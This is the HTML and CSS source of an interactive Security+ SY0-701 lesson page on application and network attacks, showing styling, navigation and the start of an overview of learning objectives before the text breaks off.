<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Application &amp; Networking-Based Attacks — Interactive Security Lesson</title>
<style>
/* ===== CSS VARIABLES / THEME ===== */
:root {
  --navy: #003366;
  --navy-dark: #001a33;
  --teal: #006666;
  --teal-light: #008080;
  --gold: #CC9900;
  --gold-light: #FFCC00;
  --white: #FFFFFF;
  --off-white: #F0F0F0;
  --light-gray: #D9D9D9;
  --mid-gray: #666666;
  --dark-gray: #333333;
  --red-err: #CC0000;
  --green-ok: #006600;
  --sky: #336699;
  --sky-light: #99CCFF;
  --section-bg: #F5F5F0;
  --card-shadow: 0 4px 16px rgba(0,0,0,.12);
  --focus-ring: 0 0 0 3px rgba(0,102,102,.5);
  --radius: 8px;
  --transition: .3s ease;
  --font-heading: 'Georgia', 'Times New Roman', serif;
  --font-body: 'Verdana', 'Geneva', sans-serif;
  --font-mono: 'Courier New', Courier, monospace;
  --danger: #CC0000;
  --danger-light: #FF4444;
  --warning: #996600;
  --warning-light: #FFAA00;
}

/* ===== RESET & BASE ===== */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { scroll-behavior: smooth; font-size: 16px; }
body {
  font-family: var(--font-body);
  color: var(--dark-gray);
  background: var(--off-white);
  line-height: 1.7;
  -webkit-font-smoothing: antialiased;
}

/* ===== SKIP LINK (ADA) ===== */
.skip-link {
  position: absolute; top: -100%; left: 16px;
  background: var(--gold); color: var(--navy-dark);
  padding: 8px 18px; border-radius: var(--radius);
  font-weight: 700; z-index: 9999; text-decoration: none;
}
.skip-link:focus { top: 12px; }

/* ===== FOCUS STYLES ===== */
:focus-visible { outline: none; box-shadow: var(--focus-ring); }
a:focus-visible, button:focus-visible, input:focus-visible, select:focus-visible, textarea:focus-visible {
  outline: 3px solid var(--teal); outline-offset: 2px;
}

/* ===== HEADER ===== */
header {
  background: linear-gradient(135deg, var(--navy-dark) 0%, var(--navy) 50%, var(--danger) 100%);
  color: var(--white); padding: 0; position: sticky; top: 0; z-index: 1000;
  box-shadow: 0 2px 12px rgba(0,0,0,.3);
}
.header-inner {
  max-width: 1280px; margin: 0 auto; padding: 16px 24px;
  display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px;
}
.header-brand { display: flex; align-items: center; gap: 14px; }
.header-icon {
  width: 48px; height: 48px; background: var(--gold);
  border-radius: 50%; display: flex; align-items: center; justify-content: center;
  font-size: 24px; color: var(--navy-dark); flex-shrink: 0; font-weight: 700;
}
.header-brand h1 {
  font-family: var(--font-heading); font-size: clamp(1.1rem, 2.5vw, 1.6rem);
  font-weight: 700; letter-spacing: .02em; line-height: 1.25;
}
.header-brand p { font-size: .78rem; opacity: .85; margin-top: 2px; }

/* Progress bar */
.progress-wrap {
  width: 100%; max-width: 320px;
  display: flex; align-items: center; gap: 10px;
}
.progress-wrap label { font-size: .75rem; white-space: nowrap; font-weight: 600; }
.progress-bar-outer {
  flex: 1; height: 10px; background: rgba(255,255,255,.2);
  border-radius: 5px; overflow: hidden; position: relative;
}
.progress-bar-inner {
  height: 100%; background: var(--gold); border-radius: 5px;
  width: 0%; transition: width .5s ease;
}
.progress-pct { font-size: .75rem; font-weight: 700; min-width: 36px; text-align: right; }

/* ===== NAV ===== */
nav {
  background: var(--navy);
  border-bottom: 3px solid var(--gold);
}
.nav-inner {
  max-width: 1280px; margin: 0 auto; padding: 0 24px;
  display: flex; align-items: stretch; gap: 0; overflow-x: auto;
}
.nav-inner::-webkit-scrollbar { height: 3px; }
.nav-inner::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 4px; }
.nav-btn {
  background: none; border: none; color: rgba(255,255,255,.75);
  font-family: var(--font-body); font-size: .8rem; font-weight: 600;
  padding: 12px 18px; cursor: pointer; white-space: nowrap;
  border-bottom: 3px solid transparent; transition: var(--transition);
}
.nav-btn:hover, .nav-btn:focus { color: var(--white); background: rgba(255,255,255,.07); }
.nav-btn.active {
  color: var(--gold); border-bottom-color: var(--gold);
  background: rgba(255,255,255,.05);
}
.nav-btn .nav-num {
  display: inline-block; background: var(--teal); color: var(--white);
  width: 20px; height: 20px; border-radius: 50%; font-size: .68rem;
  line-height: 20px; text-align: center; margin-right: 6px;
}
.nav-btn.active .nav-num { background: var(--gold); color: var(--navy-dark); }
.nav-btn.completed .nav-num { background: var(--green-ok); }

/* ===== MAIN ===== */
main { max-width: 1280px; margin: 0 auto; padding: 24px; }

/* ===== SECTIONS ===== */
.lesson-section { display: none; animation: fadeUp .5s ease; }
.lesson-section.active { display: block; }

@keyframes fadeUp {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

/* ===== TYPOGRAPHY ===== */
.section-header {
  background: linear-gradient(135deg, var(--navy) 0%, var(--danger) 100%);
  color: var(--white); padding: 28px 32px; border-radius: var(--radius) var(--radius) 0 0;
  margin-bottom: 0;
}
.section-header h2 {
  font-family: var(--font-heading); font-size: clamp(1.4rem, 3vw, 2rem);
  font-weight: 700; line-height: 1.25;
}
.section-header .obj-tag {
  display: inline-block; background: var(--gold); color: var(--navy-dark);
  padding: 3px 12px; border-radius: 20px; font-size: .72rem;
  font-weight: 700; margin-top: 8px; letter-spacing: .04em;
}

.section-body {
  background: var(--white); padding: 32px;
  border-radius: 0 0 var(--radius) var(--radius);
  box-shadow: var(--card-shadow); margin-bottom: 32px;
}
.section-body h3 {
  font-family: var(--font-heading); font-size: 1.3rem;
  color: var(--navy); margin: 28px 0 12px; padding-bottom: 6px;
  border-bottom: 2px solid var(--gold-light);
}
.section-body h3:first-child { margin-top: 0; }
.section-body h4 {
  font-size: 1.05rem; color: var(--teal); margin: 20px 0 8px; font-weight: 700;
}
.section-body p { margin-bottom: 14px; }
.section-body ul, .section-body ol { margin: 0 0 14px 24px; }
.section-body li { margin-bottom: 6px; }

/* ===== CARDS ===== */
.card-grid {
  display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 20px; margin: 20px 0;
}
.info-card {
  background: var(--section-bg); border-left: 4px solid var(--teal);
  padding: 20px; border-radius: 0 var(--radius) var(--radius) 0;
  transition: var(--transition);
}
.info-card:hover { box-shadow: var(--card-shadow); transform: translateY(-2px); }
.info-card h4 { color: var(--navy); margin: 0 0 8px; font-size: 1rem; }
.info-card p { font-size: .88rem; margin: 0; }
.info-card.danger-card { border-left-color: var(--danger); }
.info-card.warning-card { border-left-color: var(--warning); }

.highlight-card {
  background: linear-gradient(135deg, #fffff0, #fffde0);
  border: 2px solid var(--gold); border-radius: var(--radius);
  padding: 20px 24px; margin: 20px 0;
}
.highlight-card .card-label {
  display: inline-block; background: var(--gold); color: var(--navy-dark);
  padding: 2px 10px; border-radius: 12px; font-size: .72rem;
  font-weight: 700; margin-bottom: 8px; text-transform: uppercase;
}

.danger-highlight {
  background: linear-gradient(135deg, #fff5f5, #ffe8e8);
  border: 2px solid var(--danger); border-radius: var(--radius);
  padding: 20px 24px; margin: 20px 0;
}
.danger-highlight .card-label {
  display: inline-block; background: var(--danger); color: var(--white);
  padding: 2px 10px; border-radius: 12px; font-size: .72rem;
  font-weight: 700; margin-bottom: 8px; text-transform: uppercase;
}

/* ===== ATTACK FLOW DIAGRAM ===== */
.attack-flow {
  background: var(--navy-dark); border-radius: var(--radius);
  padding: 24px; margin: 20px 0; overflow-x: auto; color: var(--white);
}
.attack-flow h4 { color: var(--gold); margin-bottom: 16px; }
.flow-steps {
  display: flex; align-items: center; gap: 0; flex-wrap: nowrap;
  overflow-x: auto; padding-bottom: 8px;
}
.flow-step {
  display: flex; flex-direction: column; align-items: center;
  min-width: 120px; text-align: center;
}
.flow-node {
  width: 56px; height: 56px; border-radius: 50%;
  background: linear-gradient(135deg, var(--teal), var(--teal-light));
  border: 2px solid var(--gold); display: flex; align-items: center;
  justify-content: center; font-size: 1.4rem; cursor: pointer;
  transition: var(--transition); margin-bottom: 8px;
}
.flow-node:hover, .flow-node.active { background: linear-gradient(135deg, var(--danger), #990000); transform: scale(1.1); box-shadow: 0 0 18px rgba(204,0,0,.5); }
.flow-node.attacker { background: linear-gradient(135deg, #660000, var(--danger)); }
.flow-node.victim { background: linear-gradient(135deg, var(--navy), var(--sky)); }
.flow-label { font-size: .72rem; font-weight: 600; line-height: 1.3; max-width: 110px; }
.flow-arrow { color: var(--gold); font-size: 1.4rem; flex-shrink: 0; padding: 0 6px; margin-bottom: 28px; }
.flow-detail {
  background: rgba(255,255,255,.1); border: 1px solid var(--gold);
  border-radius: var(--radius); padding: 12px; margin-top: 16px;
  font-size: .85rem; display: none;
}
.flow-detail.visible { display: block; animation: fadeUp .3s ease; }

/* ===== INTERACTIVE DIAGRAMS ===== */
.diagram-wrap {
  background: var(--navy-dark); border-radius: var(--radius);
  padding: 24px; margin: 20px 0; overflow-x: auto; color: var(--white);
}
.diagram-wrap h4 { color: var(--gold); margin-bottom: 16px; }

/* ===== INTERACTIVE DEMO ===== */
.demo-box {
  background: var(--section-bg); border: 2px solid var(--light-gray);
  border-radius: var(--radius); padding: 24px; margin: 20px 0;
}
.demo-box h4 { color: var(--navy); margin-bottom: 12px; font-size: 1.05rem; }
.demo-row { display: flex; gap: 16px; flex-wrap: wrap; align-items: flex-start; margin-bottom: 16px; }
.demo-field { flex: 1; min-width: 200px; }
.demo-field label {
  display: block; font-weight: 700; font-size: .82rem;
  margin-bottom: 4px; color: var(--navy);
}
.demo-field input, .demo-field select, .demo-field textarea {
  width: 100%; padding: 10px 12px; border: 2px solid var(--light-gray);
  border-radius: var(--radius); font-family: var(--font-body);
  font-size: .9rem; transition: var(--transition); background: var(--white);
}
.demo-field input:focus, .demo-field select:focus, .demo-field textarea:focus {
  border-color: var(--teal); box-shadow: var(--focus-ring);
}
.demo-field textarea { min-height: 70px; resize: vertical; font-family: var(--font-mono); }
.demo-output {
  background: var(--navy-dark); color: #66ff66; padding: 14px 18px;
  border-radius: var(--radius); font-family: var(--font-mono);
  font-size: .82rem; word-break: break-all; min-height: 48px;
  border: 2px solid var(--teal);
}
.demo-output.danger-out { color: #ff6666; border-color: var(--danger); }
.demo-output.warning-out { color: #ffcc44; border-color: var(--warning); }

/* ===== BUTTONS ===== */
.btn {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 10px 22px; border: none; border-radius: var(--radius);
  font-family: var(--font-body); font-size: .88rem; font-weight: 700;
  cursor: pointer; transition: var(--transition); text-decoration: none;
}
.btn-primary { background: var(--teal); color: var(--white); }
.btn-primary:hover { background: var(--teal-light); }
.btn-gold { background: var(--gold); color: var(--navy-dark); }
.btn-gold:hover { background: var(--gold-light); }
.btn-navy { background: var(--navy); color: var(--white); }
.btn-navy:hover { background: var(--sky); }
.btn-danger { background: var(--danger); color: var(--white); }
.btn-danger:hover { background: var(--danger-light); }
.btn-outline { background: none; border: 2px solid var(--teal); color: var(--teal); }
.btn-outline:hover { background: var(--teal); color: var(--white); }
.btn:disabled { opacity: .5; cursor: not-allowed; }

/* ===== TABS (sub-tabs) ===== */
.sub-tabs { display: flex; gap: 0; margin-bottom: 0; border-bottom: 2px solid var(--light-gray); flex-wrap: wrap; }
.sub-tab-btn {
  background: var(--section-bg); border: none; padding: 10px 20px;
  font-family: var(--font-body); font-size: .85rem; font-weight: 600;
  cursor: pointer; color: var(--mid-gray); transition: var(--transition);
  border-bottom: 3px solid transparent;
}
.sub-tab-btn:hover { color: var(--navy); }
.sub-tab-btn.active { color: var(--teal); border-bottom-color: var(--teal); background: var(--white); }
.sub-tab-content { display: none; padding: 20px 0; }
.sub-tab-content.active { display: block; animation: fadeUp .3s ease; }

/* ===== ACCORDION ===== */
.accordion { margin: 16px 0; }
.accordion-item { border: 1px solid var(--light-gray); border-radius: var(--radius); margin-bottom: 8px; overflow: hidden; }
.accordion-header {
  width: 100%; background: var(--section-bg); border: none;
  padding: 14px 20px; font-family: var(--font-body); font-size: .92rem;
  font-weight: 700; color: var(--navy); cursor: pointer;
  display: flex; justify-content: space-between; align-items: center;
  transition: var(--transition); text-align: left;
}
.accordion-header:hover { background: var(--light-gray); }
.accordion-header .acc-icon { font-size: 1.2rem; transition: transform .3s ease; flex-shrink: 0; }
.accordion-item.open .accordion-header { background: var(--navy); color: var(--white); }
.accordion-item.open .acc-icon { transform: rotate(180deg); color: var(--gold); }
.accordion-body { padding: 0 20px; max-height: 0; overflow: hidden; transition: max-height .4s ease, padding .4s ease; }
.accordion-item.open .accordion-body { max-height: 2000px; padding: 16px 20px; }

/* ===== QUIZ ===== */
.quiz-container { margin: 20px 0; }
.quiz-question {
  background: var(--white); border: 2px solid var(--light-gray);
  border-radius: var(--radius); padding: 20px; margin-bottom: 16px;
  transition: var(--transition);
}
.quiz-question.correct { border-color: var(--green-ok); background: #f0fff0; }
.quiz-question.incorrect { border-color: var(--red-err); background: #fff5f5; }
.quiz-question .q-number {
  display: inline-block; background: var(--navy); color: var(--white);
  width: 28px; height: 28px; border-radius: 50%; text-align: center;
  line-height: 28px; font-size: .82rem; font-weight: 700; margin-right: 8px;
}
.quiz-question .q-text { font-weight: 700; margin-bottom: 12px; font-size: .95rem; }
.quiz-option {
  display: block; padding: 10px 14px; margin-bottom: 6px;
  border: 2px solid var(--light-gray); border-radius: var(--radius);
  cursor: pointer; transition: var(--transition); font-size: .88rem;
  background: var(--white);
}
.quiz-option:hover { border-color: var(--teal); background: #f0fafa; }
.quiz-option input { margin-right: 8px; }
.quiz-option.selected { border-color: var(--teal); background: #e0f0f0; }
.quiz-option.right { border-color: var(--green-ok); background: #e0ffe0; }
.quiz-option.wrong { border-color: var(--red-err); background: #ffe0e0; }
.quiz-feedback {
  margin-top: 8px; padding: 10px 14px; border-radius: var(--radius);
  font-size: .85rem; display: none;
}
.quiz-feedback.show { display: block; animation: fadeUp .3s ease; }
.quiz-feedback.correct-fb { background: #e0ffe0; color: var(--green-ok); border: 1px solid var(--green-ok); }
.quiz-feedback.incorrect-fb { background: #ffe0e0; color: var(--red-err); border: 1px solid var(--red-err); }
.quiz-score {
  background: linear-gradient(135deg, var(--navy), var(--teal));
  color: var(--white); padding: 24px; border-radius: var(--radius);
  text-align: center; margin-top: 24px; display: none;
}
.quiz-score .score-num { font-size: 2.5rem; font-weight: 700; font-family: var(--font-heading); }
.quiz-score .score-label { font-size: .9rem; opacity: .85; }

/* ===== FLASHCARD ===== */
.flashcard-deck { display: flex; flex-direction: column; align-items: center; gap: 16px; margin: 20px 0; }
.flashcard {
  width: 100%; max-width: 500px; min-height: 200px;
  perspective: 1000px; cursor: pointer;
}
.flashcard-inner {
  position: relative; width: 100%; height: 200px;
  transition: transform .6s; transform-style: preserve-3d;
}
.flashcard.flipped .flashcard-inner { transform: rotateY(180deg); }
.flashcard-face {
  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
  backface-visibility: hidden; border-radius: var(--radius);
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  padding: 24px; text-align: center;
}
.flashcard-front {
  background: linear-gradient(135deg, var(--navy), var(--danger));
  color: var(--white); font-weight: 700; font-size: 1.05rem;
  border: 3px solid var(--gold);
}
.flashcard-front .fc-label { font-size: .72rem; opacity: .7; margin-bottom: 8px; text-transform: uppercase; letter-spacing: .06em; }
.flashcard-back {
  background: var(--white); color: var(--dark-gray);
  transform: rotateY(180deg); font-size: .9rem; line-height: 1.6;
  border: 3px solid var(--teal);
}
.fc-controls { display: flex; gap: 12px; align-items: center; }
.fc-counter { font-size: .85rem; color: var(--mid-gray); font-weight: 600; min-width: 80px; text-align: center; }

/* ===== EMBEDDED VIDEO ===== */
.yt-embed-grid {
  display: grid; grid-template-columns: repeat(auto-fill, minmax(420px, 1fr));
  gap: 24px; margin: 20px 0 32px;
}
@media (max-width: 520px) { .yt-embed-grid { grid-template-columns: 1fr; } }
.yt-embed-card {
  background: var(--white); border-radius: var(--radius);
  overflow: hidden; box-shadow: var(--card-shadow);
  transition: var(--transition); border: 2px solid transparent;
}
.yt-embed-card:hover { border-color: var(--teal); box-shadow: 0 8px 24px rgba(0,0,0,.15); }
.yt-embed-card:focus-within { border-color: var(--gold); box-shadow: 0 4px 16px rgba(204,153,0,.25); }
.yt-embed-wrap {
  position: relative; width: 100%; padding-bottom: 56.25%;
  background: #000; cursor: pointer; overflow: hidden;
}
.yt-embed-wrap iframe {
  position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0;
}
.yt-facade {
  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
  display: flex; align-items: center; justify-content: center;
  background-size: cover; background-position: center; background-repeat: no-repeat;
  cursor: pointer; border: 0; padding: 0; margin: 0;
}
.yt-facade::before {
  content: ""; position: absolute; inset: 0;
  background: linear-gradient(0deg, rgba(0,0,0,.45) 0%, rgba(0,0,0,.12) 50%, rgba(0,0,0,.30) 100%);
  transition: background .25s ease;
}
.yt-facade:hover::before { background: rgba(0,0,0,.35); }
.yt-facade .yt-play-btn {
  position: relative; z-index: 2; width: 68px; height: 48px;
  background: #CC0000; border-radius: 14px; border: 0;
  display: flex; align-items: center; justify-content: center;
  transition: background .2s ease, transform .2s ease;
  box-shadow: 0 4px 16px rgba(0,0,0,.4); pointer-events: none;
}
.yt-facade:hover .yt-play-btn { background: #FF0000; transform: scale(1.1); }
.yt-facade:focus-visible { outline: 3px solid var(--gold); outline-offset: -3px; }
.yt-play-btn svg { width: 24px; height: 24px; fill: #FFFFFF; margin-left: 3px; }
.yt-duration {
  position: absolute; bottom: 8px; right: 8px; z-index: 2;
  background: rgba(0,0,0,.82); color: #FFFFFF; font-size: .72rem;
  font-family: var(--font-body); padding: 2px 6px; border-radius: 3px;
  font-weight: 600; letter-spacing: .3px;
}
.yt-embed-info { padding: 14px 16px; }
.yt-embed-info h4 { font-size: .9rem; color: var(--navy); margin: 0 0 4px; }
.yt-embed-info p { font-size: .78rem; color: var(--mid-gray); margin: 0; }
.yt-embed-info .yt-channel {
  display: inline-block; margin-top: 6px;
  font-size: .72rem; font-weight: 700; color: var(--teal);
  text-transform: uppercase; letter-spacing: .5px;
}
.yt-ext-badge {
  position: absolute; top: 10px; left: 10px; z-index: 3;
  background: rgba(204,153,0,.92); color: #0D1B2A;
  font-size: .68rem; font-weight: 700;
  padding: 3px 10px; border-radius: 12px; letter-spacing: .4px;
  text-transform: uppercase; pointer-events: none;
}
.yt-section-label {
  display: flex; align-items: center; gap: 10px; margin-bottom: 8px;
}
.yt-section-label .yt-icon {
  display: inline-flex; align-items: center; justify-content: center;
  width: 36px; height: 36px; border-radius: 8px;
  background: #CC0000; color: var(--white); font-size: 1.1rem; font-weight: 700;
}
.yt-section-label span { font-size: .85rem; color: var(--mid-gray); }

/* ===== VIDEO / RESOURCE CARDS ===== */
.video-grid {
  display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  gap: 20px; margin: 20px 0;
}
.video-card {
  background: var(--white); border-radius: var(--radius);
  overflow: hidden; box-shadow: var(--card-shadow);
  transition: var(--transition); cursor: pointer;
  text-decoration: none; color: inherit; display: block;
  border: 2px solid transparent;
}
.video-card:hover { transform: translateY(-4px); box-shadow: 0 8px 24px rgba(0,0,0,.15); border-color: var(--teal); }
.video-card:focus-visible { outline: 3px solid var(--gold); outline-offset: 2px; }
.video-thumb {
  width: 100%; aspect-ratio: 16/9; background: var(--navy-dark);
  display: flex; align-items: center; justify-content: center; flex-direction: column;
  color: var(--gold); font-size: 3rem; position: relative;
}
.video-thumb .play-icon {
  width: 64px; height: 64px; background: rgba(204,153,0,.92);
  border-radius: 50%; display: flex; align-items: center; justify-content: center;
  color: var(--navy-dark); font-size: 1.6rem; transition: var(--transition);
}
.video-card:hover .play-icon { transform: scale(1.12); background: var(--gold); }
.video-thumb .source-badge {
  position: absolute; top: 10px; right: 10px;
  background: var(--teal); color: var(--white); font-size: .65rem;
  padding: 3px 10px; border-radius: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: .5px;
}
.video-thumb .source-badge.article { background: var(--gold); color: var(--navy-dark); }
.video-thumb .source-badge.reference { background: #336666; }
.video-thumb .type-label {
  margin-top: 8px; font-size: .72rem; color: rgba(255,255,255,.7); letter-spacing: .5px; text-transform: uppercase;
}
.video-card-body { padding: 16px; }
.video-card-body h4 { font-size: .92rem; color: var(--navy); margin-bottom: 4px; }
.video-card-body p { font-size: .8rem; color: var(--mid-gray); margin: 0; }
.video-card-body .video-link {
  display: inline-block; margin-top: 8px; color: var(--teal);
  font-weight: 700; font-size: .82rem; text-decoration: none;
}
.video-card-body .video-link:hover { text-decoration: underline; }
.yt-search-bar {
  background: var(--light-gray); padding: 14px 20px; border-radius: var(--radius);
  margin-bottom: 24px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
}
.yt-search-bar span { font-size: .85rem; color: var(--navy); font-weight: 700; }
.yt-search-bar a {
  display: inline-flex; align-items: center; gap: 6px;
  background: var(--navy); color: var(--white); padding: 6px 14px;
  border-radius: 20px; font-size: .78rem; text-decoration: none;
  font-weight: 600; transition: var(--transition);
}
.yt-search-bar a:hover { background: var(--teal); }
.yt-search-bar a:focus-visible { outline: 3px solid var(--gold); outline-offset: 2px; }

/* ===== TABLE ===== */
.resp-table-wrap { overflow-x: auto; margin: 16px 0; }
.resp-table { width: 100%; border-collapse: collapse; font-size: .85rem; }
.resp-table th {
  background: var(--navy); color: var(--white); padding: 12px 14px;
  text-align: left; font-weight: 700; white-space: nowrap;
}
.resp-table td { padding: 10px 14px; border-bottom: 1px solid var(--light-gray); }
.resp-table tr:nth-child(even) { background: var(--section-bg); }
.resp-table tr:hover { background: #e8f0f0; }

/* ===== ATTACK SEVERITY BADGE ===== */
.severity {
  display: inline-block; padding: 2px 10px; border-radius: 12px;
  font-size: .72rem; font-weight: 700; text-transform: uppercase; letter-spacing: .05em;
}
.sev-critical { background: #CC0000; color: #fff; }
.sev-high { background: #FF6600; color: #fff; }
.sev-medium { background: #CC9900; color: #fff; }
.sev-low { background: #006600; color: #fff; }

/* ===== COMPARE COLUMNS ===== */
.compare-columns {
  display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;
}
.compare-col {
  background: var(--white); border-radius: var(--radius); padding: 20px;
  box-shadow: var(--card-shadow); border-top: 4px solid var(--teal);
}
.compare-col.attack-col { border-top-color: var(--danger); }
.compare-col.defense-col { border-top-color: var(--green-ok); }
.compare-col h4 { margin-bottom: 12px; }

/* ===== SQL INJECTION SIMULATOR ===== */
.sql-sim {
  background: var(--navy-dark); border-radius: var(--radius);
  padding: 24px; margin: 20px 0; color: var(--white);
}
.sql-sim h4 { color: var(--gold); margin-bottom: 12px; }
.sql-input-wrap { display: flex; gap: 12px; margin-bottom: 16px; flex-wrap: wrap; }
.sql-input-wrap input {
  flex: 1; min-width: 200px; background: #1a2a3a; border: 2px solid var(--teal);
  color: var(--white); padding: 10px 14px; border-radius: var(--radius);
  font-family: var(--font-mono); font-size: .9rem;
}
.sql-input-wrap input:focus { border-color: var(--gold); outline: none; }
.sql-query-display {
  background: #0d1b2a; border: 2px solid var(--teal); border-radius: var(--radius);
  padding: 14px 18px; font-family: var(--font-mono); font-size: .85rem;
  margin-bottom: 12px; word-break: break-all; min-height: 48px;
  line-height: 1.6;
}
.sql-inject-highlight { color: var(--danger-light); font-weight: 700; }
.sql-result-display {
  background: #0d1b2a; border: 2px solid #444; border-radius: var(--radius);
  padding: 14px 18px; font-family: var(--font-mono); font-size: .82rem;
  min-height: 48px; color: #aaa;
}
.sql-result-display.danger { border-color: var(--danger); color: var(--danger-light); }
.sql-result-display.success { border-color: var(--green-ok); color: #66ff66; }

/* ===== XSS SANDBOX ===== */
.xss-sandbox {
  background: var(--section-bg); border: 2px solid var(--light-gray);
  border-radius: var(--radius); padding: 24px; margin: 20px 0;
}
.xss-preview {
  background: var(--white); border: 2px solid var(--light-gray);
  border-radius: var(--radius); padding: 16px; margin-top: 12px;
  min-height: 80px; font-size: .9rem; color: var(--dark-gray);
}

/* ===== LIFECYCLE TRACK ===== */
.lifecycle-track {
  display: flex; align-items: center; gap: 0; margin: 20px 0;
  overflow-x: auto; padding: 12px 0;
}
.lifecycle-step {
  display: flex; flex-direction: column; align-items: center;
  min-width: 110px; text-align: center; position: relative;
}
.lifecycle-circle {
  width: 50px; height: 50px; border-radius: 50%;
  background: var(--light-gray); color: var(--dark-gray);
  display: flex; align-items: center; justify-content: center;
  font-weight: 700; font-size: .85rem; transition: var(--transition);
  cursor: pointer; border: 3px solid transparent;
}
.lifecycle-circle:hover, .lifecycle-circle.active {
  background: var(--danger); color: var(--white); border-color: var(--gold);
  transform: scale(1.15);
}
.lifecycle-label { font-size: .72rem; margin-top: 6px; font-weight: 600; color: var(--navy); }
.lifecycle-arrow { font-size: 1.2rem; color: var(--gold); margin: 0 4px; flex-shrink: 0; }
.lifecycle-detail {
  background: var(--section-bg); border: 2px solid var(--teal); border-radius: var(--radius);
  padding: 16px; margin-top: 12px; font-size: .88rem; display: none;
}
.lifecycle-detail.visible { display: block; animation: fadeUp .3s ease; }

/* ===== MITIGATION CHECKLIST ===== */
.checklist { list-style: none; margin: 0 0 14px; }
.checklist li {
  display: flex; align-items: flex-start; gap: 10px; padding: 8px 12px;
  margin-bottom: 4px; border-radius: var(--radius); font-size: .9rem;
  background: var(--section-bg); transition: var(--transition); cursor: pointer;
}
.checklist li:hover { background: var(--light-gray); }
.checklist li.checked { background: #e0ffe0; color: var(--green-ok); }
.checklist li::before { content: '☐'; font-size: 1.1rem; flex-shrink: 0; }
.checklist li.checked::before { content: '☑'; }

/* ===== PRINT ===== */
@media print {
  header, nav, .progress-wrap, .btn, .quiz-container, .demo-box, .flashcard-deck { display: none; }
  .lesson-section { display: block !important; }
  .section-body { box-shadow: none; border: 1px solid #ccc; }
}

/* ===== RESPONSIVE ===== */
@media (max-width: 768px) {
  .header-inner { flex-direction: column; text-align: center; }
  .progress-wrap { max-width: 100%; }
  .nav-inner { justify-content: flex-start; }
  .section-body { padding: 20px 16px; }
  .compare-columns { grid-template-columns: 1fr; }
  .card-grid { grid-template-columns: 1fr; }
  .video-grid { grid-template-columns: 1fr; }
  .demo-row { flex-direction: column; }
  .flow-steps { flex-direction: column; align-items: center; }
  .flow-arrow { transform: rotate(90deg); margin: 4px 0; }
}
</style>
</head>
<body>

<!-- Skip Nav (ADA) -->
<a href="#main-content" class="skip-link">Skip to main content</a>

<!-- ===== HEADER ===== -->
<header role="banner">
  <div class="header-inner">
    <div class="header-brand">
      <div class="header-icon" aria-hidden="true">&#9888;</div>
      <div>
        <h1>Application &amp; Networking-Based Attacks</h1>
        <p>Interactive Security Lesson</p>
      </div>
    </div>
    <div class="progress-wrap" role="status" aria-live="polite">
      <label for="lessonProgress">Progress:</label>
      <div class="progress-bar-outer" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" id="lessonProgress">
        <div class="progress-bar-inner" id="progressBarInner"></div>
      </div>
      <span class="progress-pct" id="progressPct">0%</span>
    </div>
  </div>
</header>

<!-- ===== NAV ===== -->
<nav role="navigation" aria-label="Lesson sections">
  <div class="nav-inner" id="navInner">
    <button class="nav-btn active" data-section="0" aria-current="true">
      <span class="nav-num">1</span>Overview
    </button>
    <button class="nav-btn" data-section="1">
      <span class="nav-num">2</span>Interception Attacks
    </button>
    <button class="nav-btn" data-section="2">
      <span class="nav-num">3</span>Poisoning Attacks
    </button>
    <button class="nav-btn" data-section="3">
      <span class="nav-num">4</span>Denial of Service
    </button>
    <button class="nav-btn" data-section="4">
      <span class="nav-num">5</span>Web App Attacks
    </button>
    <button class="nav-btn" data-section="5">
      <span class="nav-num">6</span>Hijacking &amp; Overflow
    </button>
    <button class="nav-btn" data-section="6">
      <span class="nav-num">7</span>Interactive Lab
    </button>
    <button class="nav-btn" data-section="7">
      <span class="nav-num">8</span>Flashcards
    </button>
    <button class="nav-btn" data-section="8">
      <span class="nav-num">9</span>Knowledge Check
    </button>
    <button class="nav-btn" data-section="9">
      <span class="nav-num">10</span>Resources
    </button>
  </div>
</nav>

<!-- ===== MAIN CONTENT ===== -->
<main id="main-content" role="main">

<!-- ============================================================ -->
<!-- SECTION 0: OVERVIEW -->
<!-- ============================================================ -->
<section class="lesson-section active" id="section-0" aria-label="Lesson Overview">
  <div class="section-header">
    <h2>Lesson Overview: Application &amp; Networking-Based Attacks</h2>
    <span class="obj-tag">Security+ SY0-701 &bull; Domain 2: Threats, Vulnerabilities &amp; Mitigations</span>
  </div>
  <div class="section-body">
    <h3>Welcome</h3>
    <p>Understanding how attackers compromise applications and networks is foundational to defending them. This lesson examines the full spectrum of application-level and network-level attack techniques—from man-in-the-middle interception and ARP/DNS poisoning to SQL injection, cross-site scripting, denial-of-service floods, and buffer overflow exploits. You will also explore modern attack vectors including API abuse, supply chain attacks, and on-path attacks that appear in the current Security+ exam.</p>
    <p>This lesson aligns with <strong>CompTIA Security+ SY0-701</strong>, specifically Domain 2 (Threats, Vulnerabilities &amp; Mitigations) objectives covering attack techniques, indicators of compromise, and application security weaknesses.</p>

    <h3>Learning Objectives</h3>
    <div class="card-grid">
      <div class="info-card danger-card">
        <h4>&#128272; Objective 1: Interception &amp; Poisoning</h4>
        <p>Identify man-in-the-middle, on-path, replay, ARP poisoning, and DNS poisoning attacks and their mechanisms.</p>
      </div>
      <div class="info-card danger-card">
        <h4>&#128165; Objective 2: Denial of Service</h4>
        <p>Explain DoS and DDoS attack types — SYN flood, Smurf, DNS amplification, and volumetric/protocol/application-layer variants.</p>
      </div>
      <div class="info-card warning-card">
        <h4>&#128187; Objective 3: Web Application Attacks</h4>
        <p>Describe XSS, XSRF, SQL injection, command injection, directory traversal, and file inclusion vulnerabilities.</p>
      </div>
      <div class="info-card">
